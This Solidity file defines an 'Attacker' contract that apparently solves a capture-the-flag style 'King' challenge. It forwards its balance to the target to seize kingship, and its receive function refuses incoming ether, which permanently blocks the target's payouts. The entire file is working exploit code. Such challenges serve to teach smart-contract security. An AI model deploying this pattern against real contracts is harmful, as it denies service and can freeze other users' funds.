// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./contract.sol";

contract Attacker {
    King targetContract;
    address owner;
    constructor(King _targetContract) {
        targetContract = _targetContract;
        owner = msg.sender;
    }

    receive() external payable {
        require(msg.sender == owner, 'Attacker: cant send ether in');
    }

    function attack() public {
       (bool success,) = address(targetContract).call{value: address(this).balance }("");
       require(success == true, 'Attacker: attack failed');
    }
}
